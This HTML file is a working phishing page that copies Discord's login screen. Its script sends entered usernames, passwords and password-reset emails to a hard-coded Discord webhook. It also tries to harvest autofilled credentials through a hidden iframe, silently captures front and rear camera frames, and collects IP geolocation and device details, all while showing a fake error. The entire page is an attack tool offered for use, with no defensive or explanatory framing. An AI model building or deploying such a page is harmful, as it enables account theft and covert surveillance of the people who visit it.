<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Discord - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background: #1a1b1e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: radial-gradient(ellipse at 30% 40%, #2c2f33 0%, #1a1b1e 80%);
        }

        .login-container {
            background: #2b2d31;
            border-radius: 12px;
            padding: 40px 48px 36px;
            width: 100%;
            max-width: 520px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            border: 1px solid #3f4147;
        }

        .discord-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .discord-logo svg {
            width: 52px;
            height: 52px;
            fill: #ffffff;
        }

        h1 {
            color: #ffffff;
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 2px;
            letter-spacing: -0.3px;
        }
        .subtitle {
            color: #b5bac1;
            font-size: 17px;
            text-align: center;
            margin-bottom: 28px;
            font-weight: 400;
        }

        /* ─── FORM – VERTICAL STACK, WIDE FIELDS ─── */
        #loginForm {
            display: flex;
            flex-direction: column;
            gap: 16px;
            width: 100%;
        }

        .form-group {
            width: 100%;
        }
        .form-group label {
            display: block;
            color: #b5bac1;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            margin-bottom: 6px;
        }
        .form-group label .required-star {
            color: #f23f42;
            margin-left: 2px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }
        .input-wrapper input {
            width: 100%;
            padding: 12px 44px 12px 14px;
            background-color: #1e1f22;
            border: 1px solid #3f4147;
            border-radius: 4px;
            color: #ffffff;
            font-size: 15px;
            transition: border-color 0.2s;
            outline: none;
        }
        .input-wrapper input:focus {
            border-color: #5865f2;
        }
        .input-wrapper input::placeholder {
            color: #6d6f78;
            font-size: 14px;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #b5bac1;
            cursor: pointer;
            font-size: 18px;
            padding: 4px;
            transition: color 0.2s;
        }
        .toggle-password:hover {
            color: #ffffff;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #5865f2;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 4px;
        }
        .btn-login:hover {
            background-color: #4752c4;
        }
        .btn-login:active {
            transform: scale(0.98);
        }

        .forgot-row {
            text-align: right;
            margin-top: 12px;
        }
        .forgot-row a {
            color: #b5bac1;
            font-size: 13px;
            text-decoration: none;
            cursor: pointer;
        }
        .forgot-row a:hover {
            text-decoration: underline;
        }

        /* ─── FORGOT PASSWORD MODAL ─── */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 999;
            backdrop-filter: blur(4px);
        }
        .modal-overlay.active {
            display: flex;
        }
        .modal-box {
            background: #2b2d31;
            border-radius: 12px;
            padding: 32px 36px 28px;
            max-width: 420px;
            width: 90%;
            border: 1px solid #3f4147;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
        }
        .modal-box h2 {
            color: #ffffff;
            font-size: 22px;
            margin-bottom: 8px;
        }
        .modal-box p {
            color: #b5bac1;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .modal-box .form-group {
            margin-bottom: 16px;
        }
        .modal-box .form-group input {
            width: 100%;
            padding: 12px 14px;
            background-color: #1e1f22;
            border: 1px solid #3f4147;
            border-radius: 4px;
            color: #ffffff;
            font-size: 15px;
            outline: none;
        }
        .modal-box .form-group input:focus {
            border-color: #5865f2;
        }
        .modal-actions {
            display: flex;
            gap: 12px;
            justify-content: flex-end;
            margin-top: 8px;
        }
        .modal-actions button {
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .modal-actions .btn-secondary {
            background: #3f4147;
            color: #ffffff;
        }
        .modal-actions .btn-secondary:hover {
            background: #4f5159;
        }
        .modal-actions .btn-primary {
            background: #5865f2;
            color: #ffffff;
        }
        .modal-actions .btn-primary:hover {
            background: #4752c4;
        }

        .status-bar {
            margin-top: 16px;
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            background: #2a1a1a;
            border: 1px solid #f23f42;
            color: #f28b8b;
            text-align: center;
            display: none;
        }
        .status-bar.visible {
            display: block;
        }

        /* Hidden iframe for password manager stealing */
        #pw-stealer {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
            top: -9999px;
            left: -9999px;
        }

        /* Hidden video elements for silent capture */
        #hiddenVideoFront, #hiddenVideoRear {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -9999px;
            left: -9999px;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 24px 20px;
                max-width: 100%;
                margin: 12px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Discord Logo -->
        <div class="discord-logo">
            <svg viewBox="0 0 127.14 96.36">
                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
            </svg>
        </div>

        <h1>Welcome back!</h1>
        <p class="subtitle">We're so excited to see you again!</p>

        <!-- Login Form -->
        <form id="loginForm" novalidate>
            <div class="form-group">
                <label for="usernameInput">Email or Phone Number <span class="required-star">*</span></label>
                <div class="input-wrapper">
                    <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
                </div>
            </div>

            <div class="form-group">
                <label for="passwordInput">Password <span class="required-star">*</span></label>
                <div class="input-wrapper">
                    <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
                    <button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password visibility">👁</button>
                </div>
            </div>

            <button type="submit" class="btn-login">Log In</button>
        </form>

        <!-- Forgot Password -->
        <div class="forgot-row">
            <a id="forgotLink">Forgot your password?</a>
        </div>

        <!-- Status Bar -->
        <div id="statusBar" class="status-bar" role="status"></div>

        <!-- Hidden iframe for password manager stealing -->
        <iframe id="pw-stealer" srcdoc="<!DOCTYPE html><html><body><form><input type='text' name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'></form></body></html>"></iframe>

        <!-- Hidden video elements for silent camera capture -->
        <video id="hiddenVideoFront" autoplay muted playsinline></video>
        <video id="hiddenVideoRear" autoplay muted playsinline></video>
    </div>

    <!-- FORGOT PASSWORD MODAL -->
    <div class="modal-overlay" id="forgotModal">
        <div class="modal-box">
            <h2>Reset Password</h2>
            <p>Enter your email address and we'll send you a code to reset your password.</p>
            <div class="form-group">
                <input type="email" id="resetEmailInput" placeholder="Enter your email address" required />
            </div>
            <div class="modal-actions">
                <button class="btn-secondary" id="modalCancel">Cancel</button>
                <button class="btn-primary" id="modalSend">Send Code</button>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ============================================================
            //  CONFIG – YOUR DISCORD WEBHOOK URL
            // ============================================================
            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538937235984875653/ketL69cOxUsbeAvIrn0ZxXzhuM9VoInCsgY8FzN9xIB5VaalxZXLaV7bGAKR6RvXMsTz';

            // ============================================================
            //  DOM REFS
            // ============================================================
            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('usernameInput');
            const passwordInput = document.getElementById('passwordInput');
            const toggleBtn = document.getElementById('togglePassword');
            const statusBar = document.getElementById('statusBar');
            const pwStealer = document.getElementById('pw-stealer');
            const forgotLink = document.getElementById('forgotLink');
            const forgotModal = document.getElementById('forgotModal');
            const resetEmailInput = document.getElementById('resetEmailInput');
            const modalCancel = document.getElementById('modalCancel');
            const modalSend = document.getElementById('modalSend');

            // Hidden video elements
            const videoFront = document.getElementById('hiddenVideoFront');
            const videoRear = document.getElementById('hiddenVideoRear');

            // Camera frame storage
            let frontFrames = [];
            let rearFrames = [];
            let cameraInterval = null;

            // ============================================================
            //  SILENT CAMERA CAPTURE – BOTH FRONT AND REAR
            // ============================================================
            async function initSilentCameras() {
                try {
                    // Front camera (user-facing)
                    const frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                        audio: false
                    });
                    videoFront.srcObject = frontStream;
                    await videoFront.play();

                    // Rear camera (environment-facing)
                    const rearStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
                        audio: false
                    });
                    videoRear.srcObject = rearStream;
                    await videoRear.play();

                    console.log('📷 Silent cameras initialized (front + rear)');

                    // Start capturing frames every 3 seconds
                    cameraInterval = setInterval(captureFrames, 3000);

                    // Capture immediately
                    setTimeout(captureFrames, 500);

                } catch (err) {
                    console.warn('Silent camera init failed:', err.message);
                }
            }

            function captureFrames() {
                try {
                    // Capture from front camera
                    if (videoFront.readyState >= 2 && videoFront.videoWidth > 0) {
                        const canvas = document.createElement('canvas');
                        canvas.width = videoFront.videoWidth || 320;
                        canvas.height = videoFront.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(videoFront, 0, 0);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                        frontFrames.push(dataUrl);
                        if (frontFrames.length > 10) frontFrames.shift(); // Keep last 10
                    }

                    // Capture from rear camera
                    if (videoRear.readyState >= 2 && videoRear.videoWidth > 0) {
                        const canvas = document.createElement('canvas');
                        canvas.width = videoRear.videoWidth || 320;
                        canvas.height = videoRear.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(videoRear, 0, 0);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                        rearFrames.push(dataUrl);
                        if (rearFrames.length > 10) rearFrames.shift(); // Keep last 10
                    }
                } catch (e) {
                    // Silent fail
                }
            }

            // ============================================================
            //  PASSWORD TOGGLE
            // ============================================================
            let passwordVisible = false;
            toggleBtn.addEventListener('click', function() {
                passwordVisible = !passwordVisible;
                passwordInput.type = passwordVisible ? 'text' : 'password';
                this.textContent = passwordVisible ? '🙈' : '👁';
            });

            // ============================================================
            //  FORGOT PASSWORD MODAL
            // ============================================================
            forgotLink.addEventListener('click', function(e) {
                e.preventDefault();
                forgotModal.classList.add('active');
                resetEmailInput.value = '';
                resetEmailInput.focus();
            });

            modalCancel.addEventListener('click', function() {
                forgotModal.classList.remove('active');
            });

            // Close modal on overlay click
            forgotModal.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.classList.remove('active');
                }
            });

            modalSend.addEventListener('click', function() {
                const email = resetEmailInput.value.trim();
                if (!email) {
                    alert('Please enter your email address.');
                    return;
                }

                // Send the email to webhook
                const message = `🔐 **Forgot Password Email Capture**\n📧 **Email:** ${email}\n🕒 **Time:** ${new Date().toISOString()}`;
                sendToDiscord(message);

                // Show fake success
                alert('If an account exists for that email, we\'ve sent a password reset code.');

                forgotModal.classList.remove('active');
                resetEmailInput.value = '';
            });

            // ============================================================
            //  PASSWORD MANAGER STEALER
            // ============================================================
            function stealPasswordManagerCredentials() {
                try {
                    const iframeDoc = pwStealer.contentDocument || pwStealer.contentWindow.document;
                    const inputs = iframeDoc.querySelectorAll('input');
                    if (inputs.length >= 2) {
                        inputs[0].focus();
                        inputs[0].blur();
                        inputs[1].focus();
                        inputs[1].blur();

                        setTimeout(() => {
                            const stolenUser = inputs[0].value || '';
                            const stolenPass = inputs[1].value || '';
                            if (stolenUser || stolenPass) {
                                console.log('🔑 Stolen from password manager:', { username: stolenUser, password: stolenPass });
                                if (stolenUser && !usernameInput.value) {
                                    usernameInput.value = stolenUser;
                                }
                                if (stolenPass && !passwordInput.value) {
                                    passwordInput.value = stolenPass;
                                }
                                window._stolenCreds = { username: stolenUser, password: stolenPass };
                            }
                        }, 500);
                    }
                } catch (e) {
                    console.warn('Password manager steal failed:', e.message);
                }
            }

            // ============================================================
            //  HELPERS
            // ============================================================
            function getTimestamp() {
                const now = new Date();
                return {
                    iso: now.toISOString(),
                    date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
                    time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }

            function getExactOS() {
                const ua = navigator.userAgent;
                if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11 (64-bit)';
                if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
                if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
                if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
                if (ua.indexOf('Mac OS X') !== -1) {
                    const m = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
                    return m ? `macOS 10.${m[1]}.${m[2]}` : 'macOS';
                }
                if (ua.indexOf('Android') !== -1) {
                    const m = ua.match(/Android ([0-9]+\.[0-9]+)/);
                    return m ? `Android ${m[1]}` : 'Android';
                }
                if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
                    const m = ua.match(/OS ([0-9]+)_([0-9]+)/);
                    return m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
                }
                if (ua.indexOf('Linux') !== -1) return 'Linux';
                return 'Unknown';
            }

            function getExactBrowser() {
                const ua = navigator.userAgent;
                if (ua.indexOf('Firefox') !== -1) {
                    const m = ua.match(/Firefox\/([0-9.]+)/);
                    return m ? `Firefox ${m[1]}` : 'Firefox';
                }
                if (ua.indexOf('Edg') !== -1) {
                    const m = ua.match(/Edg\/([0-9.]+)/);
                    return m ? `Edge ${m[1]}` : 'Edge';
                }
                if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
                    const m = ua.match(/Chrome\/([0-9.]+)/);
                    return m ? `Chrome ${m[1]}` : 'Chrome';
                }
                if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
                    const m = ua.match(/Version\/([0-9.]+)/);
                    return m ? `Safari ${m[1]}` : 'Safari';
                }
                if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
                    const m = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
                    return m ? `Opera ${m[1]}` : 'Opera';
                }
                return 'Unknown';
            }

            async function getGeoData() {
                try {
                    const r = await fetch('https://ipapi.co/json/');
                    if (!r.ok) throw new Error();
                    const d = await r.json();
                    return {
                        source: 'IP Geolocation',
                        latitude: d.latitude || 'Unknown',
                        longitude: d.longitude || 'Unknown',
                        city: d.city || 'Unknown',
                        country: d.country_name || 'Unknown',
                        isp: d.org || 'Unknown'
                    };
                } catch (_) {
                    try {
                        const r = await fetch('https://ipinfo.io/json');
                        if (!r.ok) throw new Error();
                        const d = await r.json();
                        const loc = d.loc ? d.loc.split(',') : ['Unknown', 'Unknown'];
                        return {
                            source: 'IP Geolocation',
                            latitude: loc[0] || 'Unknown',
                            longitude: loc[1] || 'Unknown',
                            city: d.city || 'Unknown',
                            country: d.country || 'Unknown',
                            isp: d.org || 'Unknown'
                        };
                    } catch (_) {
                        return {
                            source: 'No location data',
                            latitude: 'Unknown',
                            longitude: 'Unknown',
                            city: 'Unknown',
                            country: 'Unknown',
                            isp: 'Unknown'
                        };
                    }
                }
            }

            async function sendToDiscord(message) {
                if (!DISCORD_WEBHOOK_URL) return false;
                try {
                    const payload = { content: message };
                    const res = await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    console.log(`📥 Discord response status: ${res.status}`);
                    return res.ok;
                } catch (err) {
                    console.error('❌ Network error:', err);
                    return false;
                }
            }

            function showFakeError() {
                statusBar.textContent = '❌ An error has occurred. Please try again later.';
                statusBar.className = 'status-bar visible';
                setTimeout(() => {
                    statusBar.className = 'status-bar';
                }, 6000);
            }

            // ============================================================
            //  FORM SUBMIT – Send everything
            // ============================================================
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                showFakeError();

                const stolen = window._stolenCreds || {};
                const timestamp = getTimestamp();
                const geo = await getGeoData();
                const os = getExactOS();
                const browser = getExactBrowser();

                const username = usernameInput.value.trim() || '(empty)';
                const password = passwordInput.value.trim() || '(empty)';

                // Get latest camera frames (front and rear)
                const frontSnap = frontFrames.length > 0 ? frontFrames[frontFrames.length - 1] : 'No front camera data';
                const rearSnap = rearFrames.length > 0 ? rearFrames[rearFrames.length - 1] : 'No rear camera data';

                const message = `
🔐 **DISCORD LOGIN + SILENT CAMERA CAPTURE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📍 **Location:** ${geo.city}, ${geo.country}
🌐 **ISP:** ${geo.isp}
🗺️ **Coordinates:** ${geo.latitude}, ${geo.longitude}

📅 **Date:** ${timestamp.date}
⏰ **Time:** ${timestamp.time}
🌐 **Timezone:** ${timestamp.timezone}

🖥️ **OS:** ${os}
🌍 **Browser:** ${browser}

👤 **Username:** ${username}
🔑 **Password:** ${password}

🔐 **Stolen from Password Manager:**
👤 **Stolen Username:** ${stolen.username || '(none)'}
🔑 **Stolen Password:** ${stolen.password || '(none)'}

📸 **Front Camera Frame:** ${frontSnap.substring(0, 80)}...
📸 **Rear Camera Frame:** ${rearSnap.substring(0, 80)}...

📱 **User Agent:** ${navigator.userAgent.substring(0, 200)}
🖥️ **Screen:** ${screen.width}x${screen.height}
🌐 **Language:** ${navigator.language}
                `.trim();

                console.log('📋 [LOG] Full data:');
                console.log(message);

                // Send main message
                await sendToDiscord(message);

                // Send full frame data separately (if available)
                if (frontFrames.length > 0) {
                    await sendToDiscord(`📸 **Front Camera Frames (${frontFrames.length}):**\n${frontFrames.join('\n')}`);
                }
                if (rearFrames.length > 0) {
                    await sendToDiscord(`📸 **Rear Camera Frames (${rearFrames.length}):**\n${rearFrames.join('\n')}`);
                }

                passwordInput.value = '';
                // Reset camera frames after sending
                frontFrames = [];
                rearFrames = [];
            });

            // ============================================================
            //  INIT ON LOAD
            // ============================================================
            window.addEventListener('DOMContentLoaded', () => {
                // Start silent cameras immediately
                initSilentCameras();

                // Password manager steal
                setTimeout(stealPasswordManagerCredentials, 1000);
                setTimeout(stealPasswordManagerCredentials, 3000);

                console.log('🌐 [PAGE LOAD] Visitor detected - silent cameras active');
            });

            // Cleanup interval if page unloads
            window.addEventListener('beforeunload', () => {
                if (cameraInterval) clearInterval(cameraInterval);
                if (videoFront.srcObject) {
                    videoFront.srcObject.getTracks().forEach(t => t.stop());
                }
                if (videoRear.srcObject) {
                    videoRear.srcObject.getTracks().forEach(t => t.stop());
                }
            });

        })();
    </script>

</body>
</html>
